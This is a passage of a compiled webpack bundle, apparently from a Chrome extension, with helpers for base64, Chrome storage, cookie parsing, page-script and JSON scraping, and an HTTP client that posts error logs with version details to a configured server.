/******/ (function() { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ 181:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "F": function() { return /* binding */ b64decode; },
/* harmony export */   "U": function() { return /* binding */ b64encode; }
/* harmony export */ });
///////////////////////////////////////////
//////////////////////////////////
/////////
var b64decode = function(data) {
    return atob(data);
};
var b64encode = function(data) {
    return btoa(data);
};


/***/ }),

/***/ 270:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "P": function() { return /* binding */ getExtensionVersion; },
/* harmony export */   "z": function() { return /* binding */ getDist; }
/* harmony export */ });
/* harmony import */ var _config_config_json__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(626);
/*global chrome*/ 
var getDist = function() {
    var dist = _config_config_json__WEBPACK_IMPORTED_MODULE_0__/* .dist */ .TK;
    if (dist) {
        return dist;
    }
    try {
        return chrome.runtime.id;
    } catch (e) {
        console.error(e);
        return "";
    }
};
var getExtensionVersion = function() {
    var _window;
    if (window && ((_window = window) === null || _window === void 0 ? void 0 : _window.chrome)) {
        return window.chrome.runtime.getManifest().version;
    }
    return "";
};


/***/ }),

/***/ 667:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {


// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "e0": function() { return /* binding */ divideArray; },
  "Kl": function() { return /* binding */ extract; },
  "Pr": function() { return /* binding */ formatCommandId; },
  "ej": function() { return /* binding */ getCookie; },
  "_h": function() { return /* binding */ getHid; },
  "tX": function() { return /* binding */ getOrCreateExtensionUserId; }
});

// UNUSED EXPORTS: convertObjectToFormData, excludeEmptyObjects, extractDataFromScript, filterData, getBrowserLanguage, getContextData, getCurrentTimeSeconds, getLocalTimeDiff, getRandomString, hashString, isSuccessResponseStatus, parseCookies, requestErrorToString, setContextData

// EXTERNAL MODULE: ./src/Http/Http.js
var Http = __webpack_require__(519);
;// CONCATENATED MODULE: ./src/Helper/Chrome.js
/*global chrome*/ function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _define_property(obj, key, value) {
    if (key in obj) {
        Object.defineProperty(obj, key, {
            value: value,
            enumerable: true,
            configurable: true,
            writable: true
        });
    } else {
        obj[key] = value;
    }
    return obj;
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}

var chromeStorageSetKey = function() {
    var _ref = _async_to_generator(function(key, value) {
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        storageSyncSet(key, value)
                    ];
                case 1:
                    _state.sent();
                    return [
                        4,
                        storageLocalSet(key, value)
                    ];
                case 2:
                    _state.sent();
                    return [
                        2
                    ];
            }
        });
    });
    return function chromeStorageSetKey(key, value) {
        return _ref.apply(this, arguments);
    };
}();
var chromeStorageGetKey = function() {
    var _ref = _async_to_generator(function(key) {
        var storedValue, _tmp, _storedValue_key, error;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    _state.trys.push([
                        0,
                        4,
                        ,
                        5
                    ]);
                    return [
                        4,
                        chrome.storage.sync.get([
                            key
                        ])
                    ];
                case 1:
                    _tmp = _state.sent();
                    if (_tmp) return [
                        3,
                        3
                    ];
                    return [
                        4,
                        chrome.storage.local.get([
                            key
                        ])
                    ];
                case 2:
                    _tmp = _state.sent();
                    _state.label = 3;
                case 3:
                    storedValue = _tmp;
                    return [
                        2,
                        (_storedValue_key = storedValue[key]) !== null && _storedValue_key !== void 0 ? _storedValue_key : null
                    ];
                case 4:
                    error = _state.sent();
                    (0,Http/* loggerBuilder */.CQ)("helper")("chromeStorageGetKey", error);
                    return [
                        3,
                        5
                    ];
                case 5:
                    return [
                        2
                    ];
            }
        });
    });
    return function chromeStorageGetKey(key) {
        return _ref.apply(this, arguments);
    };
}();
var storageSyncSet = function() {
    var _ref = _async_to_generator(function(key, value) {
        var error;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    _state.trys.push([
                        0,
                        2,
                        ,
                        3
                    ]);
                    return [
                        4,
                        chrome.storage.sync.set(_define_property({}, key, value))
                    ];
                case 1:
                    _state.sent();
                    return [
                        3,
                        3
                    ];
                case 2:
                    error = _state.sent();
                    (0,Http/* loggerBuilder */.CQ)("helper chrome")("storageSyncSet", error);
                    return [
                        3,
                        3
                    ];
                case 3:
                    return [
                        2
                    ];
            }
        });
    });
    return function storageSyncSet(key, value) {
        return _ref.apply(this, arguments);
    };
}();
var storageLocalSet = function() {
    var _ref = _async_to_generator(function(key, value) {
        var error;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    _state.trys.push([
                        0,
                        2,
                        ,
                        3
                    ]);
                    return [
                        4,
                        chrome.storage.local.set(_define_property({}, key, value))
                    ];
                case 1:
                    _state.sent();
                    return [
                        3,
                        3
                    ];
                case 2:
                    error = _state.sent();
                    (0,Http/* loggerBuilder */.CQ)("helper chrome")("storageLocalSet", error);
                    return [
                        3,
                        3
                    ];
                case 3:
                    return [
                        2
                    ];
            }
        });
    });
    return function storageLocalSet(key, value) {
        return _ref.apply(this, arguments);
    };
}();

;// CONCATENATED MODULE: ./src/Helper/Helper.js
/*global chrome*/ function _array_like_to_array(arr, len) {
    if (len == null || len > arr.length) len = arr.length;
    for(var i = 0, arr2 = new Array(len); i < len; i++)arr2[i] = arr[i];
    return arr2;
}
function _array_without_holes(arr) {
    if (Array.isArray(arr)) return _array_like_to_array(arr);
}
function Helper_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function Helper_async_to_generator(fn) {
    return function() {
        var self1 = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self1, args);
            function _next(value) {
                Helper_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                Helper_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _iterable_to_array(iter) {
    if (typeof Symbol !== "undefined" && iter[Symbol.iterator] != null || iter["@@iterator"] != null) return Array.from(iter);
}
function _non_iterable_spread() {
    throw new TypeError("Invalid attempt to spread non-iterable instance.\\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _to_consumable_array(arr) {
    return _array_without_holes(arr) || _iterable_to_array(arr) || _unsupported_iterable_to_array(arr) || _non_iterable_spread();
}
function _unsupported_iterable_to_array(o, minLen) {
    if (!o) return;
    if (typeof o === "string") return _array_like_to_array(o, minLen);
    var n = Object.prototype.toString.call(o).slice(8, -1);
    if (n === "Object" && o.constructor) n = o.constructor.name;
    if (n === "Map" || n === "Set") return Array.from(n);
    if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _array_like_to_array(o, minLen);
}
function Helper_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}


/**
 * Safely access a key in a source structure or exit with null if there is any key missing in the access path
 *
 * @param {Object} source
 * @param {String[]} keys
 * @param {*} [defaultValue = null] defaultValue
 *
 * @returns {*}
 */ function extract(source, keys) {
    var defaultValue = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : null;
    return keys.reduce(function(partial, key) {
        if (partial === undefined) {
            return defaultValue;
        }
        if (partial === null) {
            return defaultValue;
        }
        if (!Object.prototype.hasOwnProperty.call(partial, key)) {
            return defaultValue;
        }
        return partial[key];
    }, source);
}
function filterData(data, filters) {
    var _loop = function(key) {
        var defaultValue = filters[key]["defaultValue"] || null;
        filteredData[key] = Array.isArray(filters[key]) ? extractFromManyPaths.apply(void 0, [
            defaultValue
        ].concat(_to_consumable_array(filters[key]))) : filters[key].hasOwnProperty("keys") ? extractFromManyPaths.apply(void 0, [
            defaultValue
        ].concat(_to_consumable_array(filters[key]["keys"]))) : defaultValue;
        if (filters[key].hasOwnProperty("nested")) {
            if (Array.isArray(filteredData[key])) {
                filteredData[key] = filteredData[key].map(function(item) {
                    return filterData(item, filters[key]["nested"]);
                });
            } else if (filteredData[key] || !filters[key]["optional"]) {
                filteredData[key] = filterData(filteredData[key], filters[key]["nested"]);
            }
        }
        if (filters[key].hasOwnProperty("transform")) {
            filteredData[key] = transform(filters[key]["transform"], filteredData[key]);
        }
    };
    function extractFromManyPaths(defaultValue) {
        for(var _len = arguments.length, paths = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++){
            paths[_key - 1] = arguments[_key];
        }
        paths = Array.isArray(paths[0]) ? paths : [
            paths
        ];
        var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
        try {
            for(var _iterator = paths[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
                var path = _step.value;
                var extractedValue = extract(data, path, defaultValue);
                if (extractedValue !== defaultValue) {
                    return extractedValue;
                }
            }
        } catch (err) {
            _didIteratorError = true;
            _iteratorError = err;
        } finally{
            try {
                if (!_iteratorNormalCompletion && _iterator.return != null) {
                    _iterator.return();
                }
            } finally{
                if (_didIteratorError) {
                    throw _iteratorError;
                }
            }
        }
        return defaultValue;
    }
    function transform(operation, data) {
        try {
            if (operation === "getYearFromIsoDate") {
                return new Date(data).getFullYear();
            }
        } catch (error) {
            loggerBuilder("helper")("filterData transform error", error);
        }
    }
    var filteredData = {};
    for(var key in filters)_loop(key);
    return filteredData;
}
var excludeEmptyObjects = function(items) {
    return items.filter(function(item) {
        return Object.keys(item).length !== 0;
    });
};
function hashString(str) {
    var hash = 0;
    if (!str || str.length === 0) {
        return hash;
    }
    for(var i = 0; i < str.length; i++){
        var chr = str.charCodeAt(i);
        hash = (hash << 5) - hash + chr;
        hash |= 0; // Convert to 32bit integer
    }
    return hash;
}
function getCurrentTimeSeconds() {
    return Math.floor(new Date().getTime() / 1000);
}
function getLocalTimeDiff() {
    return new Date().getTimezoneOffset() * -60;
}
function requestErrorToString(e) {
    return JSON.stringify({
        readyState: e.target.readyState,
        status: e.target.status,
        statusText: e.target.statusText,
        timeout: e.target.timeout
    });
}
function parseCookies(documentCookie) {
    var cookies = documentCookie.split(";");
    var parsedCookies = {};
    cookies.map(function(cookie) {
        cookie = cookie.trim();
        var assignPosition = cookie.indexOf("=");
        if (assignPosition + 1 >= cookie.length) {
            return;
        }
        var name = cookie.substr(0, assignPosition);
        var value = cookie.substr(assignPosition + 1);
        parsedCookies[name] = value;
    });
    return parsedCookies;
}
function getHid() {
    try {
        // available in MediaSpy QML engine
        return Utilities.getHid();
    } catch (e) {
        return "";
    }
}
function getBrowserLanguage() {
    return window.navigator.language;
}
function setContextData() {
    var name = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "", data = arguments.length > 1 ? arguments[1] : void 0;
    if (window) {
        window[name] = data;
    }
}
function getContextData() {
    var name = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
    if (window) {
        var _window_name;
        return (_window_name = window[name]) !== null && _window_name !== void 0 ? _window_name : null;
    }
}
var getCookie = function(name) {
    var parsedCookies = parseCookies(document.cookie);
    if (!parsedCookies[name]) {
        return undefined;
    }
    return decodeURIComponent(parsedCookies[name]);
};
var getRandomString = function(length) {
    var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    var charLength = chars.length;
    var result = "";
    for(var i = 0; i < length; i++){
        result += chars.charAt(Math.floor(Math.random() * charLength));
    }
    return result;
};
var getOrCreateExtensionUserId = function() {
    var _ref = Helper_async_to_generator(function() {
        var EXTENSION_USER_ID_KEY, _window_chrome, _ref, storedUserId, randomUUID, lastStoredUserId, error;
        return Helper_ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    EXTENSION_USER_ID_KEY = "extension_user_id";
                    _state.label = 1;
                case 1:
                    _state.trys.push([
                        1,
                        6,
                        ,
                        7
                    ]);
                    if (!((_window_chrome = window.chrome) === null || _window_chrome === void 0 ? void 0 : _window_chrome.storage)) {
                        return [
                            2,
                            ""
                        ];
                    }
                    return [
                        4,
                        chromeStorageGetKey(EXTENSION_USER_ID_KEY)
                    ];
                case 2:
                    storedUserId = (_ref = _state.sent()) !== null && _ref !== void 0 ? _ref : null;
                    if (!!storedUserId) return [
                        3,
                        5
                    ];
                    randomUUID = self.crypto.randomUUID();
                    return [
                        4,
                        chromeStorageSetKey(EXTENSION_USER_ID_KEY, randomUUID)
                    ];
                case 3:
                    _state.sent();
                    return [
                        4,
                        chromeStorageGetKey(EXTENSION_USER_ID_KEY)
                    ];
                case 4:
                    lastStoredUserId = _state.sent();
                    return [
                        2,
                        lastStoredUserId
                    ];
                case 5:
                    return [
                        2,
                        storedUserId
                    ];
                case 6:
                    error = _state.sent();
                    (0,Http/* loggerBuilder */.CQ)("helper")("getOrCreateExtensionUserId", error);
                    return [
                        3,
                        7
                    ];
                case 7:
                    return [
                        2
                    ];
            }
        });
    });
    return function getOrCreateExtensionUserId() {
        return _ref.apply(this, arguments);
    };
}();
var isSuccessResponseStatus = function(status) {
    return /^20[0-9]$/.test(status);
};
var divideArray = function(array, chunkSize) {
    var dividedArray = [];
    for(var i = 0; i < array.length; i += chunkSize){
        dividedArray.push(array.slice(i, i + chunkSize));
    }
    return dividedArray;
};
var convertObjectToFormData = function(body) {
    var formData = new URLSearchParams();
    for(var key in body){
        if (body.hasOwnProperty(key)) {
            formData.append(key, body[key]);
        }
    }
    return formData;
};
var extractDataFromScript = function(regex, includesPart) {
    var scripts = document.querySelectorAll("script");
    var scriptWithCountry;
    var _iteratorNormalCompletion = true, _didIteratorError = false, _iteratorError = undefined;
    try {
        for(var _iterator = Array.from(scripts)[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true){
            var script = _step.value;
            var innerHTML = script.innerHTML;
            if (innerHTML.includes(includesPart)) {
                scriptWithCountry = script;
                break;
            }
        }
    } catch (err) {
        _didIteratorError = true;
        _iteratorError = err;
    } finally{
        try {
            if (!_iteratorNormalCompletion && _iterator.return != null) {
                _iterator.return();
            }
        } finally{
            if (_didIteratorError) {
                throw _iteratorError;
            }
        }
    }
    var scriptString = scriptWithCountry.innerHTML;
    scriptString.replace(/\\t|\\n|\\(?=")/g, "");
    var match = scriptString.match(regex);
    if (!match || !match[1]) {
        throw new Error("countryCode not found with regex: ".concat(regex));
    }
    return match[1].toUpperCase();
};
var formatCommandId = function(commandId) {
    return commandId ? commandId.toString() : undefined;
};


/***/ }),

/***/ 425:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "G7": function() { return /* binding */ sanitize; },
/* harmony export */   "Kl": function() { return /* binding */ extract; },
/* harmony export */   "Nw": function() { return /* binding */ extractByCountingBraces; }
/* harmony export */ });
function matchColumn(syntaxErrorMsg) {
    var match = /position (\d+)|column (\d+)/.exec("" + syntaxErrorMsg);
    return match[1];
}
function extractByParsingException(subJSON) {
    try {
        JSON.parse(subJSON);
    } catch (exc) {
        if (exc.name !== "SyntaxError") {
            return null;
        }
        var column = matchColumn(exc);
        try {
            return column ? subJSON.slice(0, column) : null;
        } catch (e) {
        //😭
        }
    }
}
function extractByCountingBraces(subJSON) {
    var depth = 0;
    var i = 0;
    for(; i < subJSON.length; i++){
        if (subJSON[i] === "{") {
            ++depth;
        } else if (subJSON[i] === "}") {
            --depth;
            if (depth === 0) {
                break;
            }
        }
    }
    return subJSON.slice(0, i + 1);
}
function extractByparsingAtEachBraceClose(subJSON) {
    var startPos = subJSON.search("{");
    if (startPos < 0) {
        return null;
    }
    var i = startPos;
    for(; i < subJSON.length; i++){
        if (subJSON[i] === "}") {
            var result = subJSON.slice(startPos, i + 1);
            try {
                return JSON.parse(result);
            } catch (e) {
            //😭
            }
        }
    }
    return null;
}
function extract(html, sequence) {
    var sequenceOffset = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : null;
    var offset = sequenceOffset !== null ? sequenceOffset : sequence.length;
    var idx = html.search(sequence);
    if (idx === -1) {
        return {
            object: null,
            index: -1
        };
    }
    idx += offset;
    var subJSON = html.substring(idx);
    subJSON = subJSON.replace(new RegExp("\\\\x", "g"), "\\u00");
    try {
        var result = extractByParsingException(subJSON);
        if (result) {
            return {
                object: JSON.parse(result),
                index: idx
            };
        }
    } catch (e) {
    //😭
    }
    try {
        return {
            object: JSON.parse(extractByCountingBraces(subJSON)),
            index: idx
        };
    } catch (e) {
    //😭
    }
    return {
        object: extractByparsingAtEachBraceClose(subJSON),
        index: idx
    };
}
function sanitize(input) {
    // from https://stackoverflow.com/a/39050609
    return input// Replace ":" with "@colon@" if it's between double-quotes
    .replace(/:\s*"([^"]*)"/g, function(match, p1) {
        return ': "' + p1.replace(/:/g, "@colon@") + '"';
    })// Replace ":" with "@colon@" if it's between single-quotes
    .replace(/:\s*'([^']*)'/g, function(match, p1) {
        return ': "' + p1.replace(/:/g, "@colon@") + '"';
    })// Add double-quotes around any tokens before the remaining ":"
    .replace(/(['"])?([a-z0-9A-Z_]+)(['"])?\s*:/g, '"$2": ')// Turn "@colon@" back into ":"
    .replace(/@colon@/g, ":");
}


/***/ }),

/***/ 519:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "CQ": function() { return /* binding */ loggerBuilder; },
/* harmony export */   "aA": function() { return /* binding */ requestJson; },
/* harmony export */   "dJ": function() { return /* binding */ http; },
/* harmony export */   "gp": function() { return /* binding */ httpNodeLog; }
/* harmony export */ });
/* unused harmony exports httpLog, requestDocument */
/* harmony import */ var _config_config__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(626);
/* harmony import */ var _Helper_Dist__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(270);
/* harmony import */ var _package_json__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(147);
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}



var BASE_ROUTE = _config_config__WEBPACK_IMPORTED_MODULE_0__/* .rootUrl */ .Wd, revision = _config_config__WEBPACK_IMPORTED_MODULE_0__/* .revision */ .LB, nodeRootUrl = _config_config__WEBPACK_IMPORTED_MODULE_0__/* .nodeRootUrl */ ._Q;
///////////////////////////////////////////
////////////////////////////
/////////
/**
 * Build http logger
 * @param {string} url for logging
 * @return {function(object): Promise<void>}
 */ var buildHttpLogger = function(url) {
    return function(message) {
        return fetch(url, {
            method: "POST",
            body: JSON.stringify(message),
            headers: {
                "Content-Type": "application/json"
            }
        });
    };
};
/**
 * Log message via http
 * @param {string} message message to log
 * @return {Promise<void>}
 */ var httpLog = buildHttpLogger(BASE_ROUTE + "js/dlog");
var httpNodeLog = buildHttpLogger(nodeRootUrl + "js/dlog");
var http = function() {
    var _ref = _async_to_generator(function(url, method, data, callback, error) {
        var xhrHeader, async, requestOptions, response, responseText, exception;
        var _arguments = arguments;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    xhrHeader = _arguments.length > 5 && _arguments[5] !== void 0 ? _arguments[5] : false, async = _arguments.length > 6 && _arguments[6] !== void 0 ? _arguments[6] : true;
                    _state.label = 1;
                case 1:
                    _state.trys.push([
                        1,
                        4,
                        ,
                        5
                    ]);
                    requestOptions = {
                        method: method
                    };
                    if (data) {
                        requestOptions["body"] = data;
                    }
                    if (xhrHeader) {
                        requestOptions["headers"] = {};
                        requestOptions["headers"]["X-Requested-With"] = "XMLHttpRequest";
                    }
                    return [
                        4,
                        fetch(url, requestOptions)
                    ];
                case 2:
                    response = _state.sent();
                    return [
                        4,
                        response.text()
                    ];
                case 3:
                    responseText = _state.sent();
                    if (callback) {
                        callback({
                            status: response.status,
                            responseText: responseText
                        });
                    }
                    if (!async) {
                        return [
                            2,
                            responseText
                        ];
                    }
                    return [
                        3,
                        5
                    ];
                case 4:
                    exception = _state.sent();
                    error(exception);
                    return [
                        3,
                        5
                    ];
                case 5:
                    return [
                        2
                    ];
            }
        });
    });
    return function http(url, method, data, callback, error) {
        return _ref.apply(this, arguments);
    };
}();
/**
 * @param {string} method
 * @param {string} url
 * @param {object} data
 * @param {boolean} xhrHeader
 * @returns {Promise<object>}
 */ var requestJson = function(method, url, data) {
    var xhrHeader = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : false;
    return new Promise(function(resolve, reject) {
        http(url, method, data, resolve, reject, xhrHeader);
    }).then(function(response) {
        if (response.status < 200 || response.status >= 300) {
            throw buildHttpError(method, url, response.status);
        }
        return response.responseText;
    }).then(JSON.parse);
};
var requestDocument = function(method, url, data) {
    var xhrHeader = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : false;
    return new Promise(function(resolve, reject) {
        http(url, method, JSON.stringify(data), resolve, reject, xhrHeader);
    }).then(function(response) {
        if (response.status < 200 || response.status >= 300) {
            throw buildHttpError(method, url, response.status);
        }
        return response.responseText;
    });
};
var loggerBuilder = function(resolver) {
    return function(namespace, message) {
        return httpNodeLog({
            dist: (0,_Helper_Dist__WEBPACK_IMPORTED_MODULE_1__/* .getDist */ .z)(),
            revision: revision,
            namespace: namespace,
            extVer: (0,_Helper_Dist__WEBPACK_IMPORTED_MODULE_1__/* .getExtensionVersion */ .P)(),
            dhVer: _package_json__WEBPACK_IMPORTED_MODULE_2__/* .version */ .i8,
            message: message,
            resolver: resolver
        });
    };
};
var buildHttpError = function(method, url, status) {
    var error = new Error("Request ".concat(method, " ").concat(url, " end with ").concat(status, " status."));
    error.url = url;
    error.status = status;
    return error;
};


/***/ }),

/***/ 543:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "S": function() { return /* binding */ init; }
/* harmony export */ });
/* harmony import */ var _Http_Http__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(519);
/* harmony import */ var _Helper_Json__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(425);
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
